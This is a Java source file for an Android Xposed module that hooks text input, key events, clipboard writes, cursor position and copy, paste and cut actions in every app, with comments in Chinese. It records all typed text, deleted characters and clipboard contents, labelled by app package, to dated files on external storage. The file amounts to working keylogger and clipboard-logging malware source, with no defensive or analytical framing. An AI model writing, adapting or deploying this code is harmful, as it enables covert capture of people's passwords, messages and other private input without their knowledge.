package an.input.hook;

import android.content.ClipData;
import android.content.ClipboardManager;
import android.os.Environment;
import android.view.KeyEvent;
import android.view.inputmethod.BaseInputConnection;
import android.view.inputmethod.InputConnection;
import android.widget.TextView;
import de.robv.android.xposed.IXposedHookLoadPackage;
import de.robv.android.xposed.XC_MethodHook;
import de.robv.android.xposed.XposedBridge;
import de.robv.android.xposed.XposedHelpers;
import de.robv.android.xposed.callbacks.XC_LoadPackage.LoadPackageParam;
import java.io.File;
import java.io.FileOutputStream;
import java.io.PrintStream;
import java.util.Date;

public class MainHook implements IXposedHookLoadPackage
{
 static String[] KEYCODE_NAME = new String[]{
  "UNKNOWN","SOFT_LEFT","SOFT_RIGHT","HOME","BACK","CALL",
  "ENDCALL","0","1","2","3","4","5","6","7","8","9","STAR",
  "POUND","DPAD_UP","DPAD_DOWN","DPAD_LEFT","DPAD_RIGHT",
  "DPAD_CENTER","VOLUME_UP","VOLUME_DOWN","POWER","CAMERA",
  "CLEAR","A","B","C","D","E","F","G","H","I","J","K",
  "L","M","N","O","P","Q","R","S","T","U","V","W","X",
  "Y","Z","COMMA","PERIOD","ALT_LEFT","ALT_RIGHT","SHIFT_LEFT",
  "SHIFT_RIGHT","TAB","SPACE","SYM","EXPLORER","ENVELOPE",
  "ENTER","DEL","GRAVE","MINUS","EQUALS","LEFT_BRACKET",
  "RIGHT_BRACKET","BACKSLASH","SEMICOLON","APOSTROPHE",
  "SLASH","AT","NUM","HEADSETHOOK","FOCUS","PLUS","MENU",
  "NOTIFICATION","SEARCH","MEDIA_PLAY_PAUSE","MEDIA_STOP",
  "MEDIA_NEXT","MEDIA_PREVIOUS","MEDIA_REWIND","MEDIA_FAST_FORWARD",
  "MUTE","PAGE_UP","PAGE_DOWN","PICTSYMBOLS","SWITCH_CHARSET",
  "BUTTON_A","BUTTON_B","BUTTON_C","BUTTON_X","BUTTON_Y",
  "BUTTON_Z","BUTTON_L1","BUTTON_R1","BUTTON_L2","BUTTON_R2",
  "BUTTON_THUMBL","BUTTON_THUMBR","BUTTON_START","BUTTON_SELECT",
  "BUTTON_MODE","ESCAPE","FORWARD_DEL","CTRL_LEFT","CTRL_RIGHT",
  "CAPS_LOCK","SCROLL_LOCK","META_LEFT","META_RIGHT",
  "FUNCTION","SYSRQ","BREAK","MOVE_HOME","MOVE_END","INSERT",
  "FORWARD","MEDIA_PLAY","MEDIA_PAUSE","MEDIA_CLOSE",
  "MEDIA_EJECT","MEDIA_RECORD","F1","F2","F3","F4","F5",
  "F6","F7","F8","F9","F10","F11","F12","NUM_LOCK","NUMPAD_0",
  "NUMPAD_1","NUMPAD_2","NUMPAD_3","NUMPAD_4","NUMPAD_5",
  "NUMPAD_6","NUMPAD_7","NUMPAD_8","NUMPAD_9","NUMPAD_DIVIDE",
  "NUMPAD_MULTIPLY","NUMPAD_SUBTRACT","NUMPAD_ADD","NUMPAD_DOT",
  "NUMPAD_COMMA","NUMPAD_ENTER","NUMPAD_EQUALS","NUMPAD_LEFT_PAREN",
  "NUMPAD_RIGHT_PAREN","VOLUME_MUTE","INFO","CHANNEL_UP",
  "CHANNEL_DOWN","ZOOM_IN","ZOOM_OUT","TV","WINDOW","GUIDE",
  "DVR","BOOKMARK","CAPTIONS","SETTINGS","TV_POWER","TV_INPUT",
  "STB_POWER","STB_INPUT","AVR_POWER","AVR_INPUT","PROG_RED",
  "PROG_GREEN","PROG_YELLOW","PROG_BLUE","APP_SWITCH",
  "BUTTON_1","BUTTON_2","BUTTON_3","BUTTON_4","BUTTON_5",
  "BUTTON_6","BUTTON_7","BUTTON_8","BUTTON_9","BUTTON_10",
  "BUTTON_11","BUTTON_12","BUTTON_13","BUTTON_14","BUTTON_15",
  "BUTTON_16","LANGUAGE_SWITCH","MANNER_MODE","3D_MODE",
  "CONTACTS","CALENDAR","MUSIC","CALCULATOR","ZENKAKU_HANKAKU",
  "EISU","MUHENKAN","HENKAN","KATAKANA_HIRAGANA","YEN",
  "RO","KANA","ASSIST","BRIGHTNESS_DOWN","BRIGHTNESS_UP",
  "MEDIA_AUDIO_TRACK","SLEEP","WAKEUP","PAIRING","MEDIA_TOP_MENU",
  "11","12","LAST_CHANNEL","TV_DATA_SERVICE","VOICE_ASSIST",
  "TV_RADIO_SERVICE","TV_TELETEXT","TV_NUMBER_ENTRY",
  "TV_TERRESTRIAL_ANALOG","TV_TERRESTRIAL_DIGITAL","TV_SATELLITE",
  "TV_SATELLITE_BS","TV_SATELLITE_CS","TV_SATELLITE_SERVICE",
  "TV_NETWORK","TV_ANTENNA_CABLE","TV_INPUT_HDMI_1","TV_INPUT_HDMI_2",
  "TV_INPUT_HDMI_3","TV_INPUT_HDMI_4","TV_INPUT_COMPOSITE_1",
  "TV_INPUT_COMPOSITE_2","TV_INPUT_COMPONENT_1","TV_INPUT_COMPONENT_2",
  "TV_INPUT_VGA_1","TV_AUDIO_DESCRIPTION","TV_AUDIO_DESCRIPTION_MIX_UP",
  "TV_AUDIO_DESCRIPTION_MIX_DOWN","TV_ZOOM_MODE","TV_CONTENTS_MENU",
  "TV_MEDIA_CONTEXT_MENU","TV_TIMER_PROGRAMMING","HELP",
  "NAVIGATE_PREVIOUS","NAVIGATE_NEXT","NAVIGATE_IN","NAVIGATE_OUT",
  "STEM_PRIMARY","STEM_1","STEM_2","STEM_3","DPAD_UP_LEFT",
  "DPAD_DOWN_LEFT","DPAD_UP_RIGHT","DPAD_DOWN_RIGHT",
  "MEDIA_SKIP_FORWARD","MEDIA_SKIP_BACKWARD","MEDIA_STEP_FORWARD",
  "MEDIA_STEP_BACKWARD","SOFT_SLEEP","CUT","COPY","PASTE",
  "SYSTEM_NAVIGATION_UP","SYSTEM_NAVIGATION_DOWN","SYSTEM_NAVIGATION_LEFT",
  "SYSTEM_NAVIGATION_RIGHT"};
 
 ClipboardHook cbh = new ClipboardHook();
 Object clipboardValue = null;
 CursorHook ch = new CursorHook();
 int cursorIndex = -1;
 
 private static void writeToFile(String str)
 {
  try{
   Date today = new Date();
   File file = new File(Environment.getExternalStorageDirectory().getPath()+"/Android/data/a.input.hook/files");
   if(!file.exists())file.mkdirs();
   PrintStream ps = new PrintStream(new FileOutputStream(new File(file, String.format("%tY年%tm月%td日.txt",today,today,today)), true));
   ps.println(str);
   ps.close();
  }catch(Exception e)
  {
   XposedBridge.log(e.getMessage());
  }
 }
 
 private static void writeLogFile(String str)
 {
  try{
   Date today = new Date();
   File file = new File(Environment.getExternalStorageDirectory().getPath()+"/Android/data/a.input.hook/cache");
   if(!file.exists())file.mkdirs();
   PrintStream ps = new PrintStream(new FileOutputStream(new File(file, String.format("%tY年%tm月%td日.log",today,today,today)), true));
   ps.println(str);
   ps.close();
  }catch(Exception e)
  {
   XposedBridge.log(e.getMessage());
  }
 }
 
 private String getKeyCodeName(int keyCode)
 {
  String KeyCodeName = "KEYCODE_" + KEYCODE_NAME[keyCode];
  return KeyCodeName;
 }
 
 @Override
 public void handleLoadPackage(LoadPackageParam p1) throws Throwable
 {
  //android.view.inputmethod.BaseInputConnection.getComposingSpanEnd(null);
  //android.app.Activity.USB_SERVICE;
  //android.app.Dialog.BUTTON1;
  //监控粘贴板
  XposedHelpers.findAndHookMethod(ClipboardManager.class.getName(), p1.classLoader, "setText", CharSequence.class, cbh);
  XposedHelpers.findAndHookMethod(ClipboardManager.class.getName(), p1.classLoader, "setPrimaryClip", ClipData.class, cbh);
  
  //监控光标位置
  XposedHelpers.findAndHookMethod(TextView.class.getName(), p1.classLoader, "onSelectionChanged", Integer.TYPE, Integer.TYPE, ch);
  
  BaseWordsHook bwh = new BaseWordsHook(p1);
  KeyEventHook keh = new KeyEventHook(p1);
  
  //基础文字输入
  XposedHelpers.findAndHookMethod(BaseInputConnection.class.getName(), p1.classLoader, "commitText", CharSequence.class, Integer.TYPE, bwh);
  XposedHelpers.findAndHookMethod(BaseInputConnection.class.getName(), p1.classLoader, "setComposingText", CharSequence.class, Integer.TYPE, bwh);
  
  //系统粘贴、剪切
  XposedHelpers.findAndHookMethod(TextView.class.getName(), p1.classLoader, "onTextContextMenuItem", Integer.TYPE, new TextContextMenuHook(p1));
  
  //XposedHelpers.findAndHookMethod("com.aide.common.KeyStrokeDetector$1", p1.classLoader, "commitText", CharSequence.class, Integer.TYPE, mha);
  //XposedHelpers.findAndHookMethod("android.view.inputmethod.InputConnectionWrapper", p1.classLoader, "setComposingText", CharSequence.class, Integer.TYPE, mha);
  XposedHelpers.findAndHookMethod(BaseInputConnection.class.getName(), p1.classLoader, "sendKeyEvent", KeyEvent.class, keh);
  //XposedHelpers.findAndHookMethod("android.view.inputmethod.InputConnectionWrapper", p1.classLoader, "sendKeyEvent", KeyEvent.class, mhb);
 }
  
 class BaseWordsHook extends XC_MethodHook
 {
  LoadPackageParam lpp = null;
  
  public BaseWordsHook(LoadPackageParam p)
  {
   lpp = p;
  }
  
  protected void beforeHookedMethod(MethodHookParam param) throws Throwable
  {
   writeToFile(new Date().toLocaleString().split(" ")[1]
               + ", 包:" + lpp.packageName
               + ", 类:" + param.thisObject.getClass().getCanonicalName()
               + ", 事件:添加, 位置:" + cursorIndex
               + ", 内容:" + param.args[0]);
  }
    
 }
 
 class KeyEventHook extends XC_MethodHook
 {
  LoadPackageParam lpp = null;

  public KeyEventHook(LoadPackageParam p)
  {
   lpp = p;
  }

  protected void beforeHookedMethod(MethodHookParam param) throws Throwable
  {
   KeyEvent ket = (KeyEvent)param.args[0];
   if(ket.getAction() != KeyEvent.ACTION_UP)return;
   String className = param.thisObject.getClass().getCanonicalName();
   String keyName = getKeyCodeName(ket.getKeyCode());
   if(ket.getKeyCode() == KeyEvent.KEYCODE_DEL)
   {
    CharSequence selCharS = ((InputConnection)param.thisObject).getSelectedText(0);
    if(selCharS == null || selCharS.length() < 1)
    {
     selCharS = ((InputConnection)param.thisObject).getTextBeforeCursor(1,0);
    }
    if(selCharS == null)selCharS = "";
    keyName += ", 位置:" + cursorIndex
    + ", 内容:" + selCharS;
   }
   if(BuildConfig.DEBUG)
    writeLogFile("Action:"+ket.getAction()+" Key:"+keyName);
   writeToFile(new Date().toLocaleString().split(" ")[1]
               + ", 包:" + lpp.packageName
               + ", 类:" + className
               + ", 事件:" + keyName);
  }

 }
 
 class TextContextMenuHook extends XC_MethodHook
 {
  LoadPackageParam lpp = null;

  public TextContextMenuHook(LoadPackageParam p)
  {
   lpp = p;
  }

  protected void afterHookedMethod(MethodHookParam param) throws Throwable
  {
   if(BuildConfig.DEBUG)
    writeLogFile("触发系统复制、粘贴、剪切、全选，剪贴板内容="+clipboardValue);
   String operation = KEYCODE_NAME[0];
   switch((int)param.args[0])
   {
    case android.R.id.selectAll:
     operation = "全选";
     break;
    case android.R.id.copy:
     operation = getKeyCodeName(KeyEvent.KEYCODE_COPY);
     cursorIndex -= clipboardValue.toString().length();
     break;
    case android.R.id.paste:
     operation = getKeyCodeName(KeyEvent.KEYCODE_PASTE);
     cursorIndex -= clipboardValue.toString().length();
     break;
    case android.R.id.cut:
     operation = getKeyCodeName(KeyEvent.KEYCODE_CUT);
     break;
   }
   writeToFile(new Date().toLocaleString().split(" ")[1]
               + ", 包:" + lpp.packageName
               + ", 类:" + param.thisObject.getClass().getCanonicalName()
               + ", 事件:" + operation
               + ", 位置:" + cursorIndex
               + ", 内容:" + clipboardValue);
  }

 }
 
 class ClipboardHook extends XC_MethodHook
 {
  protected void beforeHookedMethod(MethodHookParam param) throws Throwable
  {
   if(param.args[0] instanceof ClipData)
   {
    ClipData cd = (ClipData)param.args[0];
    clipboardValue = cd.getItemAt(0).getText();
   }else
    clipboardValue = param.args[0];
   if(BuildConfig.DEBUG)
    writeLogFile("复制内容="+clipboardValue);
  }
 }
 
 class CursorHook extends XC_MethodHook
 {
  protected void beforeHookedMethod(MethodHookParam param) throws Throwable
  {
   cursorIndex = param.args[0];
   if(BuildConfig.DEBUG)
    writeLogFile("光标位置="+cursorIndex);
  }
 }
 
}
